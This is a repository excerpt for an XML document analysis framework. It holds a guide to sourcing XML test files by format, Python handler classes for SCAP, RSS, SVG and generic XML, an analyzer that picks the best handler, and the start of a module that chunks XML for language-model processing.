- Maven Central examples
- Spring Initializr generated projects

### 4. Log4j Configuration
**File Types**: `log4j.xml`, `log4j2.xml`
**Search Queries**:
- `log4j2.xml site:github.com`
- `"Configuration status=" filetype:xml log4j`
- `log4j.xml example configuration`
- `"<Appenders>" "<Loggers>" filetype:xml`

**Good Sources**:
- Java projects on GitHub
- Apache Log4j documentation
- Enterprise Java application repos

### 5. Spring Configuration
**File Types**: `applicationContext.xml`, `*-context.xml`, `beans.xml`
**Search Queries**:
- `applicationContext.xml site:github.com`
- `"springframework.org/schema/beans" filetype:xml`
- `spring beans.xml example`
- `"<bean id=" class=" filetype:xml`

**Good Sources**:
- Legacy Spring projects
- Spring documentation archives
- Enterprise Java applications

### 6. DocBook Documentation
**File Types**: `.xml`, `.docbook`
**Search Queries**:
- `"<book xmlns" docbook filetype:xml`
- `"<chapter>" "<section>" docbook filetype:xml`
- `docbook 5.0 example filetype:xml`
- `technical documentation docbook github`

**Good Sources**:
- Open source documentation projects
- O'Reilly book sources
- Technical manual repositories

### 7. SVG Graphics
**File Types**: `.svg`
**Search Queries**:
- `"<svg" "viewBox" filetype:svg`
- `icon svg site:github.com`
- `"sodipodi" inkscape filetype:svg` (Inkscape files)
- `animated svg example`

**Good Sources**:
- Icon libraries (Font Awesome, Feather)
- Wikimedia Commons
- Design tool exports

### 8. XML Sitemaps
**File Types**: `sitemap.xml`, `sitemap_index.xml`
**Search Queries**:
- `sitemap.xml -site:sitemaps.org`
- `"<urlset" "sitemaps.org/schemas" filetype:xml`
- `sitemap_index.xml example`
- `"<loc>" "<lastmod>" filetype:xml`

**Good Sources**:
- Any website's `/sitemap.xml`
- WordPress sites
- E-commerce platforms

## 📋 Planned Handlers (Need Test Files)

### 9. WSDL (Web Services Description Language)
**File Types**: `.wsdl`, `.xml`
**Search Queries**:
- `"definitions" "xmlns:wsdl" filetype:wsdl`
- `SOAP WSDL example filetype:xml`
- `"<wsdl:portType" filetype:xml`
- `web service WSDL site:github.com`

**Good Sources**:
- Public web service directories
- Government service endpoints
- Legacy enterprise integrations

### 10. XSD (XML Schema Definition)
**File Types**: `.xsd`
**Search Queries**:
- `"<xs:schema" filetype:xsd`
- `"<xsd:complexType" filetype:xsd`
- `XML schema example site:github.com`
- `"targetNamespace" schema filetype:xsd`

**Good Sources**:
- W3C specifications
- Industry standard schemas
- API documentation

### 11. KML/KMZ (Geographic Data)
**File Types**: `.kml`, `.kmz`
**Search Queries**:
- `"<kml xmlns" filetype:kml`
- `Google Earth KML example`
- `"<Placemark>" coordinates filetype:kml`
- `GPS track KML site:github.com`

**Good Sources**:
- Google Earth community
- GIS data repositories
- GPS tracking apps exports

### 12. GPX (GPS Exchange)
**File Types**: `.gpx`
**Search Queries**:
- `"<gpx version" filetype:gpx`
- `GPS track GPX example`
- `Strava GPX export site:github.com`
- `hiking trail GPX file`

**Good Sources**:
- Outdoor activity platforms
- GPS device manufacturers
- OpenStreetMap exports

### 13. Ant/NAnt Build Files
**File Types**: `build.xml`
**Search Queries**:
- `build.xml ant project site:github.com`
- `"<project name=" default=" filetype:xml ant`
- `"<target name=" depends=" filetype:xml`
- `Apache Ant build.xml example`

**Good Sources**:
- Legacy Java projects
- Apache project archives
- Enterprise build systems

### 14. NuGet Package Specs
**File Types**: `.nuspec`
**Search Queries**:
- `"<package xmlns" filetype:nuspec`
- `nuspec example site:github.com`
- `"<metadata>" "<id>" nuget filetype:xml`
- `.nuspec file example`

**Good Sources**:
- .NET projects on GitHub
- NuGet.org package sources
- Visual Studio templates

### 15. WADL (Web Application Description Language)
**File Types**: `.wadl`
**Search Queries**:
- `"<application xmlns" wadl filetype:xml`
- `REST API WADL example`
- `"<resources base=" filetype:wadl`
- `Jersey WADL site:github.com`

**Good Sources**:
- Java REST services
- API documentation
- Jersey/JAX-RS projects

### 16. RelaxNG Schemas
**File Types**: `.rng`, `.rnc`
**Search Queries**:
- `"<grammar" relaxng filetype:rng`
- `RelaxNG schema example`
- `"datatypeLibrary" filetype:rng`
- `compact syntax .rnc file`

**Good Sources**:
- XML validation projects
- DocBook schemas
- TEI schemas

### 17. DITA (Darwin Information Typing Architecture)
**File Types**: `.dita`, `.ditamap`
**Search Queries**:
- `"<topic" dita filetype:xml`
- `"<map>" ditamap filetype:xml`
- `DITA documentation example`
- `"<!DOCTYPE topic" filetype:dita`

**Good Sources**:
- Technical documentation repos
- DITA Open Toolkit
- IBM documentation

### 18. TEI (Text Encoding Initiative)
**File Types**: `.xml`
**Search Queries**:
- `"<TEI xmlns" filetype:xml`
- `"tei-c.org" manuscript filetype:xml`
- `digital humanities TEI XML`
- `"<teiHeader>" filetype:xml`

**Good Sources**:
- Digital humanities projects
- University libraries
- Historical text projects

### 19. HL7 CDA (Clinical Document Architecture)
**File Types**: `.xml`
**Search Queries**:
- `"ClinicalDocument" HL7 filetype:xml`
- `"urn:hl7-org:v3" filetype:xml`
- `CDA R2 example document`
- `"<typeId root=" HL7 filetype:xml`

**Good Sources**:
- HL7 example repository
- Healthcare IT projects
- EHR vendor documentation

### 20. XBRL (Business Reporting)
**File Types**: `.xbrl`, `.xml`
**Search Queries**:
- `"<xbrl" financial filetype:xml`
- `XBRL instance document example`
- `"xbrl.org" context filetype:xml`
- `SEC XBRL filing example`

**Good Sources**:
- SEC EDGAR database
- XBRL.org examples
- Financial reporting tools

### 21. PMML (Predictive Models)
**File Types**: `.pmml`
**Search Queries**:
- `"<PMML" version filetype:pmml`
- `"DataDictionary" model filetype:xml`
- `machine learning PMML example`
- `"<RegressionModel" filetype:xml`

**Good Sources**:
- Data science projects
- ML model repositories
- PMML.org examples

### 22. XSLT (Transformations)
**File Types**: `.xsl`, `.xslt`
**Search Queries**:
- `"<xsl:stylesheet" filetype:xsl`
- `XSLT transformation example`
- `"<xsl:template match=" filetype:xsl`
- `XML to HTML XSLT site:github.com`

**Good Sources**:
- XML processing projects
- Documentation generators
- Web development repos

### 23. XSL-FO (Formatting Objects)
**File Types**: `.fo`, `.xml`
**Search Queries**:
- `"<fo:root" filetype:xml`
- `XSL-FO example PDF generation`
- `"fo:page-sequence" filetype:xml`
- `Apache FOP examples`

**Good Sources**:
- Apache FOP examples
- PDF generation projects
- Publishing workflows

## 🔍 General Search Tips

### GitHub Advanced Search
Use GitHub's advanced search with:
- `extension:xml path:/test`
- `extension:xml path:/sample`
- `extension:xml path:/example`
- `language:XML size:>1000`

### Google Dorks
- Add `-inurl:w3.org` to exclude specifications
- Use `site:raw.githubusercontent.com` for direct file access
- Add `"<?xml version"` to ensure valid XML
- Use date filters for recent examples

### File Size Considerations
- **Small files** (<100KB): Good for unit tests
- **Medium files** (100KB-10MB): Good for performance testing
- **Large files** (>10MB): Good for stress testing
- **Various encodings**: UTF-8, UTF-16, ISO-8859-1

## 📁 Recommended Test Set Structure

```
test_files/
├── small/          # <100KB files
│   ├── pom/
│   ├── rss/
│   ├── config/
│   └── ...
├── medium/         # 100KB-10MB files
│   ├── scap/
│   ├── docbook/
│   └── ...
├── large/          # >10MB files
│   ├── scap/
│   ├── xbrl/
│   └── ...
├── edge_cases/     # Malformed, unusual encodings, etc.
│   ├── malformed/
│   ├── encodings/
│   └── deeply_nested/
└── real_world/     # Actual production files
    ├── enterprise/
    ├── open_source/
    └── government/
```

## ⚠️ Legal Considerations

When collecting test files:
1. **Check licenses** - Ensure files are publicly available
2. **Remove sensitive data** - PII, credentials, internal URLs
3. **Attribute sources** - Keep track of where files came from
4. **Respect robots.txt** - When scraping websites
5. **Use synthetic data** - Generate files for sensitive domains (healthcare, finance)

## 🛠️ Test File Validation

After collecting files, validate them:
```bash
# Check if valid XML
xmllint --noout file.xml

# Check file size
ls -lh file.xml

# Check encoding
file -i file.xml

# Count elements (rough complexity check)
grep -c "<" file.xml
```

## 📊 Coverage Goals

Aim for at least:
- **3-5 examples** per handler
- **Different sizes** (small, medium, large)
- **Different versions** (where applicable)
- **Valid and invalid** examples
- **Real-world complexity** (not just tutorials)

---

This collection guide ensures comprehensive testing coverage for all current and planned XML document types in the framework.
</file>

<file path="src/core/__init__.py">
"""
Core XML Analysis Framework Components

This module contains the core framework components for XML analysis.
"""
</file>

<file path="src/core/analyzer.py">
#!/usr/bin/env python3
"""
XML Specialized Handlers System

This module provides a flexible framework for detecting and handling different XML document types.
Each handler provides specialized analysis and extraction logic for its document type.

Key features:
- Automatic document type detection
- Pluggable handler architecture
- Type-specific analysis and insights
- Standardized output format
"""

import xml.etree.ElementTree as ET
from abc import ABC, abstractmethod
from typing import Dict, List, Optional, Any, Type, Tuple
from dataclasses import dataclass, field
import re
from pathlib import Path
import json

@dataclass
class DocumentTypeInfo:
    """Information about a detected document type"""
    type_name: str
    confidence: float  # 0.0 to 1.0
    version: Optional[str] = None
    schema_uri: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)

@dataclass
class SpecializedAnalysis:
    """Results from specialized handler analysis"""
    document_type: str
    key_findings: Dict[str, Any]
    recommendations: List[str]
    data_inventory: Dict[str, int]  # What types of data found and counts
    ai_use_cases: List[str]  # Potential AI/ML applications
    structured_data: Dict[str, Any]  # Extracted structured data
    quality_metrics: Dict[str, float]  # Data quality indicators

class XMLHandler(ABC):
    """Abstract base class for XML document handlers"""
    
    @abstractmethod
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        """
        Check if this handler can process the document
        Returns: (can_handle: bool, confidence: float)
        """
        pass
    
    @abstractmethod
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        """Detect specific document type and version"""
        pass
    
    @abstractmethod
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        """Perform specialized analysis on the document"""
        pass
    
    @abstractmethod
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        """Extract the most important data from this document type"""
        pass

class SCAPHandler(XMLHandler):
    """Handler for SCAP (Security Content Automation Protocol) documents"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for SCAP-specific namespaces and elements
        scap_indicators = [
            'http://scap.nist.gov/schema/',
            'asset-report-collection',
            'data-stream-collection',
            'xccdf',
            'oval'
        ]
        
        score = 0.0
        if any(uri in str(namespaces.values()) for uri in scap_indicators[:1]):
            score += 0.5
        if root.tag.endswith('asset-report-collection'):
            score += 0.3
        if 'xccdf' in str(namespaces.values()).lower():
            score += 0.2
            
        return score > 0.5, score
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        version = None
        schema_uri = None
        
        # Extract version from namespaces
        for prefix, uri in namespaces.items():
            if 'scap.nist.gov' in uri:
                schema_uri = uri
                # Extract version from URI if present
                version_match = re.search(r'/(\d+\.\d+)/?$', uri)
                if version_match:
                    version = version_match.group(1)
        
        return DocumentTypeInfo(
            type_name="SCAP Security Report",
            confidence=0.9,
            version=version,
            schema_uri=schema_uri,
            metadata={
                "standard": "NIST SCAP",
                "category": "security_compliance"
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {}
        data_inventory = {}
        
        # Analyze SCAP-specific elements
        # Count security rules
        rules = root.findall('.//*[@id]')
        findings['total_rules'] = len(rules)
        
        # Count vulnerabilities/findings
        findings['vulnerabilities'] = self._count_vulnerabilities(root)
        
        # Extract compliance status
        findings['compliance_summary'] = self._extract_compliance_summary(root)
        
        recommendations = [
            "Use for automated compliance monitoring",
            "Extract failed rules for remediation workflows",
            "Trend analysis on compliance scores over time",
            "Risk scoring based on vulnerability severity"
        ]
        
        ai_use_cases = [
            "Automated compliance report generation",
            "Predictive risk analysis",
            "Remediation recommendation engine",
            "Compliance trend forecasting",
            "Security posture classification"
        ]
        
        return SpecializedAnalysis(
            document_type="SCAP Security Report",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=data_inventory,
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._calculate_quality_metrics(root)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        # Extract key SCAP data
        return {
            "scan_results": self._extract_scan_results(root),
            "system_info": self._extract_system_info(root),
            "compliance_scores": self._extract_compliance_scores(root)
        }
    
    def _count_vulnerabilities(self, root: ET.Element) -> Dict[str, int]:
        # Implementation for counting vulnerabilities by severity
        return {"high": 0, "medium": 0, "low": 0}
    
    def _extract_compliance_summary(self, root: ET.Element) -> Dict[str, Any]:
        # Implementation for extracting compliance summary
        return {}
    
    def _extract_scan_results(self, root: ET.Element) -> List[Dict[str, Any]]:
        # Implementation for extracting scan results
        return []
    
    def _extract_system_info(self, root: ET.Element) -> Dict[str, Any]:
        # Implementation for extracting system information
        return {}
    
    def _extract_compliance_scores(self, root: ET.Element) -> Dict[str, float]:
        # Implementation for extracting compliance scores
        return {}
    
    def _calculate_quality_metrics(self, root: ET.Element) -> Dict[str, float]:
        return {
            "completeness": 0.85,
            "consistency": 0.90,
            "data_density": 0.75
        }

class RSSHandler(XMLHandler):
    """Handler for RSS feed documents"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        if root.tag == 'rss' or root.tag.endswith('}rss'):
            return True, 1.0
        if root.tag == 'feed':  # Atom feeds
            return True, 0.9
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        version = root.get('version', '2.0')
        feed_type = 'RSS' if root.tag.endswith('rss') else 'Atom'
        
        return DocumentTypeInfo(
            type_name=f"{feed_type} Feed",
            confidence=1.0,
            version=version,
            metadata={
                "standard": feed_type,
                "category": "content_syndication"
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        channel = root.find('.//channel') or root
        items = root.findall('.//item') or root.findall('.//{http://www.w3.org/2005/Atom}entry')
        
        findings = {
            'total_items': len(items),
            'has_descriptions': sum(1 for item in items if item.find('.//description') is not None),
            'has_dates': sum(1 for item in items if item.find('.//pubDate') is not None),
            'categories': self._extract_categories(items)
        }
        
        recommendations = [
            "Use for content aggregation and analysis",
            "Extract for trend analysis and topic modeling",
            "Monitor for content updates and changes"
        ]
        
        ai_use_cases = [
            "Content categorization and tagging",
            "Trend detection and analysis",
            "Sentiment analysis on articles",
            "Topic modeling and clustering",
            "Content recommendation systems"
        ]
        
        return SpecializedAnalysis(
            document_type="RSS/Atom Feed",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={'articles': len(items), 'categories': len(findings['categories'])},
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._calculate_feed_quality(root, items)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        items = root.findall('.//item') or root.findall('.//{http://www.w3.org/2005/Atom}entry')
        
        return {
            'feed_metadata': self._extract_feed_metadata(root),
            'items': [self._extract_item_data(item) for item in items[:10]]  # First 10 items
        }
    
    def _extract_categories(self, items) -> List[str]:
        categories = set()
        for item in items:
            for cat in item.findall('.//category'):
                if cat.text:
                    categories.add(cat.text)
        return list(categories)
    
    def _extract_feed_metadata(self, root: ET.Element) -> Dict[str, Any]:
        channel = root.find('.//channel') or root
        return {
            'title': getattr(channel.find('.//title'), 'text', None),
            'description': getattr(channel.find('.//description'), 'text', None),
            'link': getattr(channel.find('.//link'), 'text', None)
        }
    
    def _extract_item_data(self, item: ET.Element) -> Dict[str, Any]:
        return {
            'title': getattr(item.find('.//title'), 'text', None),
            'description': getattr(item.find('.//description'), 'text', None),
            'pubDate': getattr(item.find('.//pubDate'), 'text', None),
            'link': getattr(item.find('.//link'), 'text', None)
        }
    
    def _calculate_feed_quality(self, root: ET.Element, items: List[ET.Element]) -> Dict[str, float]:
        total = len(items)
        if total == 0:
            return {"completeness": 0.0, "consistency": 0.0, "data_density": 0.0}
        
        with_desc = sum(1 for item in items if item.find('.//description') is not None)
        with_date = sum(1 for item in items if item.find('.//pubDate') is not None)
        
        return {
            "completeness": (with_desc + with_date) / (2 * total),
            "consistency": 1.0 if with_desc == total else with_desc / total,
            "data_density": 0.8  # Typical for RSS feeds
        }

class SVGHandler(XMLHandler):
    """Handler for SVG (Scalable Vector Graphics) documents"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        if root.tag == '{http://www.w3.org/2000/svg}svg' or root.tag == 'svg':
            return True, 1.0
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        return DocumentTypeInfo(
            type_name="SVG Graphics",
            confidence=1.0,
            version=root.get('version', '1.1'),
            schema_uri="http://www.w3.org/2000/svg",
            metadata={
                "standard": "W3C SVG",
                "category": "graphics"
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'dimensions': {
                'width': root.get('width'),
                'height': root.get('height'),
                'viewBox': root.get('viewBox')
            },
            'element_types': self._count_svg_elements(root),
            'has_animations': self._check_animations(root),
            'has_scripts': len(root.findall('.//script')) > 0,
            'complexity_score': self._calculate_complexity(root)
        }
        
        recommendations = [
            "Extract for design system documentation",
            "Analyze for accessibility improvements",
            "Convert to other formats for broader compatibility"
        ]
        
        ai_use_cases = [
            "Automatic icon/graphic classification",
            "Design pattern recognition",
            "Accessibility analysis",
            "Style extraction for design systems",
            "Vector graphic optimization"
        ]
        
        return SpecializedAnalysis(
            document_type="SVG Graphics",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=findings['element_types'],
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._calculate_svg_quality(root)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'metadata': self._extract_svg_metadata(root),
            'structure': self._extract_structure(root),
            'styles': self._extract_styles(root)
        }
    
    def _count_svg_elements(self, root: ET.Element) -> Dict[str, int]:
        elements = {}
        for elem in root.iter():
            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            elements[tag] = elements.get(tag, 0) + 1
        return elements
    
    def _check_animations(self, root: ET.Element) -> bool:
        animation_tags = ['animate', 'animateTransform', 'animateMotion', 'set']
        # Extract namespace from root tag if present
        namespace = root.tag.split("}")[0][1:] if "}" in root.tag else ""
        for tag in animation_tags:
            search_path = f'.//{{{namespace}}}{tag}' if namespace else f'.//{tag}'
            if root.find(search_path) is not None:
                return True
        return False
    
    def _calculate_complexity(self, root: ET.Element) -> float:
        total_elements = len(list(root.iter()))
        return min(total_elements / 100.0, 1.0)
    
    def _extract_svg_metadata(self, root: ET.Element) -> Dict[str, Any]:
        metadata = {}
        for elem in root:
            if elem.tag.endswith('metadata'):
                # Extract metadata content
                pass
        return metadata
    
    def _extract_structure(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'groups': len(root.findall('.//g')),
            'paths': len(root.findall('.//path')),
            'max_depth': self._calculate_max_depth(root)
        }
    
    def _extract_styles(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'inline_styles': len([e for e in root.iter() if e.get('style')]),
            'classes': len(set(e.get('class', '') for e in root.iter() if e.get('class')))
        }
    
    def _calculate_max_depth(self, elem: ET.Element, depth: int = 0) -> int:
        if not list(elem):
            return depth
        return max(self._calculate_max_depth(child, depth + 1) for child in elem)
    
    def _calculate_svg_quality(self, root: ET.Element) -> Dict[str, float]:
        has_viewbox = 1.0 if root.get('viewBox') else 0.0
        has_title = 1.0 if root.find('.//title') is not None else 0.0
        
        return {
            "completeness": (has_viewbox + has_title) / 2,
            "accessibility": has_title,
            "scalability": has_viewbox
        }

class GenericXMLHandler(XMLHandler):
    """Fallback handler for generic XML documents"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # This handler can handle any XML
        return True, 0.1  # Low confidence as it's a fallback
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Try to infer type from root element and namespaces
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        return DocumentTypeInfo(
            type_name=f"Generic XML ({root_tag})",
            confidence=0.5,
            metadata={
                "root_element": root_tag,
                "namespace_count": len(namespaces)
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'structure': self._analyze_structure(root),
            'data_patterns': self._detect_patterns(root),
            'attribute_usage': self._analyze_attributes(root)
        }
        
        recommendations = [
            "Review structure for data extraction opportunities",
            "Consider creating a specialized handler for this document type",
            "Analyze repeating patterns for structured data extraction"
        ]
        
        ai_use_cases = [
            "Schema learning and validation",
            "Data extraction and transformation",
            "Pattern recognition",
            "Anomaly detection in structure"
        ]
        
        return SpecializedAnalysis(
            document_type="Generic XML",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=self._inventory_data(root),
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._analyze_quality(root)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'sample_data': self._extract_samples(root),
            'schema_inference': self._infer_schema(root)
        }
    
    def _analyze_structure(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'max_depth': self._calculate_depth(root),
            'element_count': len(list(root.iter())),
            'unique_paths': len(self._get_unique_paths(root))
        }
    
    def _detect_patterns(self, root: ET.Element) -> Dict[str, Any]:
        # Detect repeating structures
        element_counts = {}
        for elem in root.iter():
            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            element_counts[tag] = element_counts.get(tag, 0) + 1
        
        return {
            'repeating_elements': {k: v for k, v in element_counts.items() if v > 5},
            'likely_records': [k for k, v in element_counts.items() if v > 10]
        }
    
    def _analyze_attributes(self, root: ET.Element) -> Dict[str, Any]:
        attr_usage = {}
        for elem in root.iter():
            for attr in elem.attrib:
                attr_usage[attr] = attr_usage.get(attr, 0) + 1
        return attr_usage
    
    def _inventory_data(self, root: ET.Element) -> Dict[str, int]:
        inventory = {}
        for elem in root.iter():
            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            inventory[tag] = inventory.get(tag, 0) + 1
        return inventory
    
    def _extract_samples(self, root: ET.Element, max_samples: int = 5) -> List[Dict[str, Any]]:
        samples = []
        for i, elem in enumerate(root.iter()):
            if i >= max_samples:
                break
            if elem.text and elem.text.strip():
                samples.append({
                    'path': self._get_path(elem),
                    'tag': elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag,
                    'text': elem.text.strip()[:100],
                    'attributes': dict(elem.attrib)
                })
        return samples
    
    def _infer_schema(self, root: ET.Element) -> Dict[str, Any]:
        # Basic schema inference
        return {
            'probable_record_types': self._detect_patterns(root)['likely_records'],
            'hierarchical': self._calculate_depth(root) > 3
        }
    
    def _calculate_depth(self, elem: ET.Element, depth: int = 0) -> int:
        if not list(elem):
            return depth
        return max(self._calculate_depth(child, depth + 1) for child in elem)
    
    def _get_unique_paths(self, root: ET.Element) -> set:
        paths = set()
        
        def traverse(elem, path):
            current_path = f"{path}/{elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag}"
            paths.add(current_path)
            for child in elem:
                traverse(child, current_path)
        
        traverse(root, "")
        return paths
    
    def _get_path(self, elem: ET.Element) -> str:
        # Simple path extraction (would need more complex logic for full path)
        return elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
    
    def _analyze_quality(self, root: ET.Element) -> Dict[str, float]:
        total_elements = len(list(root.iter()))
        elements_with_text = sum(1 for e in root.iter() if e.text and e.text.strip())
        elements_with_attrs = sum(1 for e in root.iter() if e.attrib)
        
        return {
            "data_density": elements_with_text / total_elements if total_elements > 0 else 0,
            "attribute_usage": elements_with_attrs / total_elements if total_elements > 0 else 0,
            "structure_consistency": 0.7  # Would need more analysis
        }

class XMLDocumentAnalyzer:
    """Main analyzer that uses specialized handlers"""
    
    def __init__(self):
        # Use the new centralized handler registry
        try:
            from handlers import ALL_HANDLERS
            # Instantiate all handlers from the registry
            self.handlers = [handler_class() for handler_class in ALL_HANDLERS]
            print(f"🔄 Using new handler registry with {len(self.handlers)} handlers")
        except ImportError:
            # Fallback to old method if registry not available
            print("⚠️  Handler registry not available, using legacy handler loading")
            self.handlers: List[Type[XMLHandler]] = [
                SCAPHandler(),
                RSSHandler(),
                SVGHandler(),
                # Add more handlers here as needed
                GenericXMLHandler()  # Always last as fallback
            ]
            
            # Try to import additional handlers
            try:
                from additional_xml_handlers import (
                    MavenPOMHandler, Log4jConfigHandler, SpringConfigHandler,
                    DocBookHandler, SitemapHandler
                )
                # Insert before GenericXMLHandler
                self.handlers.insert(-1, MavenPOMHandler())
                self.handlers.insert(-1, Log4jConfigHandler())
                self.handlers.insert(-1, SpringConfigHandler())
                self.handlers.insert(-1, DocBookHandler())
                self.handlers.insert(-1, SitemapHandler())
            except ImportError:
                # Additional handlers not available
                pass
    
    def analyze_document(self, file_path: str) -> Dict[str, Any]:
        """Analyze an XML document using the appropriate handler"""
        
        # Parse the document
        try:
            tree = ET.parse(file_path)
            root = tree.getroot()
        except ET.ParseError as e:
            return {
                "error": f"Failed to parse XML: {e}",
                "file_path": file_path
            }
        
        # Extract namespaces
        namespaces = self._extract_namespaces(root)
        
        # Find the best handler
        best_handler = None
        best_confidence = 0.0
        
        for handler in self.handlers:
            can_handle, confidence = handler.can_handle(root, namespaces)
            if can_handle and confidence > best_confidence:
                best_handler = handler
                best_confidence = confidence
        
        if not best_handler:
            best_handler = self.handlers[-1]  # Use generic handler
        
        # Detect document type
        doc_type = best_handler.detect_type(root, namespaces)
        
        # Perform specialized analysis
        analysis = best_handler.analyze(root, file_path)
        
        # Combine results
        return {
            "file_path": file_path,
            "document_type": doc_type,
            "handler_used": best_handler.__class__.__name__,
            "confidence": best_confidence,
            "analysis": analysis,
            "namespaces": namespaces,
            "file_size": Path(file_path).stat().st_size
        }
    
    def _extract_namespaces(self, root: ET.Element) -> Dict[str, str]:
        """Extract all namespaces from the document"""
        namespaces = {}
        
        # Get namespaces from root element
        for key, value in root.attrib.items():
            if key.startswith('xmlns'):
                prefix = key.split(':')[1] if ':' in key else 'default'
                namespaces[prefix] = value
        
        # Also check for namespaces in element tags
        for elem in root.iter():
            if '}' in elem.tag:
                uri = elem.tag.split('}')[0][1:]
                # Try to find a prefix for this URI
                prefix = None
                for p, u in namespaces.items():
                    if u == uri:
                        prefix = p
                        break
                if not prefix:
                    prefix = f"ns{len(namespaces)}"
                    namespaces[prefix] = uri
        
        return namespaces

# Example usage
if __name__ == "__main__":
    analyzer = XMLDocumentAnalyzer()
    
    # Example: Analyze a file
    result = analyzer.analyze_document("sample_data/example.xml")
    
    print(json.dumps(result, indent=2, default=str))
</file>

<file path="src/core/chunking.py">
#!/usr/bin/env python3
"""
XML Chunking Strategy and Integration Module

This module provides intelligent chunking strategies for XML documents
to prepare them for LLM processing while preserving context and structure.
"""

import xml.etree.ElementTree as ET
from typing import List, Dict, Any, Optional, Generator, Tuple
from dataclasses import dataclass
import hashlib
import json
from pathlib import Path

@dataclass
class ChunkingConfig:
    """Configuration for chunking strategy"""
    max_chunk_size: int = 3000  # tokens (approximate)
    min_chunk_size: int = 500
    overlap_size: int = 200
    preserve_hierarchy: bool = True
    include_parent_context: bool = True
    semantic_boundaries: List[str] = None  # Element names that are natural boundaries

@dataclass
class XMLChunk:
    """Represents a chunk of XML content"""
    chunk_id: str
    content: str
    element_path: str
    start_line: int
    end_line: int
    parent_context: Optional[str]
    metadata: Dict[str, Any]
    token_estimate: int
    elements_included: List[str]
    
class XMLChunkingStrategy:
    """Base class for different chunking strategies"""
    
    def __init__(self, config: ChunkingConfig = None):
        self.config = config or ChunkingConfig()
        
    def estimate_tokens(self, text: str) -> int:
        """Rough estimation of tokens (words * 1.3)"""
        return int(len(text.split()) * 1.3)
    
    def generate_chunk_id(self, content: str, index: int) -> str:
        """Generate unique chunk ID"""
        hash_content = hashlib.md5(content.encode()).hexdigest()[:8]
        return f"chunk_{index}_{hash_content}"
    
    def chunk_document(self, file_path: str, 
                      specialized_analysis: Dict[str, Any] = None) -> List[XMLChunk]:
        """Chunk an XML document based on the strategy"""
        raise NotImplementedError

class HierarchicalChunking(XMLChunkingStrategy):
    """Chunks based on XML hierarchy, respecting element boundaries"""
    
    def chunk_document(self, file_path: str, 
                      specialized_analysis: Dict[str, Any] = None) -> List[XMLChunk]:
        chunks = []
        tree = ET.parse(file_path)
        root = tree.getroot()
        
        # Determine semantic boundaries based on document type
        if specialized_analysis:
            self.config.semantic_boundaries = self._get_semantic_boundaries(
                specialized_analysis.get('document_type', {}).get('type_name', '')
            )
        
        # Start chunking from root
        chunk_index = 0
        for chunk in self._chunk_element(root, "", chunk_index):
            chunks.append(chunk)
            chunk_index += 1
            
        return chunks
    
    def _chunk_element(self, element: ET.Element, path: str, 
                       start_index: int) -> Generator[XMLChunk, None, None]:
        """Recursively chunk an element and its children"""
        current_path = f"{path}/{element.tag}" if path else element.tag
        
        # Check if this element is a semantic boundary
        if self._is_semantic_boundary(element):
            # For hierarchical chunking, always look for smaller boundaries first
            child_boundaries = []
            for child in element:
                if self._is_semantic_boundary(child):
                    child_boundaries.append(child)
            
            # If we have semantic boundary children, chunk them individually
            if child_boundaries and element.tag.split('}')[-1] not in ['Rule']:  # Don't subdivide Rules
                yield from self._process_children(element, current_path, start_index)
            else:
                # No boundary children or this is a leaf boundary - create chunk
                content = ET.tostring(element, encoding='unicode')
                tokens = self.estimate_tokens(content)
                
                if tokens <= self.config.max_chunk_size:
                    # Element fits in one chunk
                    yield self._create_chunk(element, current_path, start_index, content)
                else:
                    # Element too large, need to split children
                    yield from self._split_large_element(element, current_path, start_index)
        else:
            # Not a boundary, continue processing children
            yield from self._process_children(element, current_path, start_index)
    
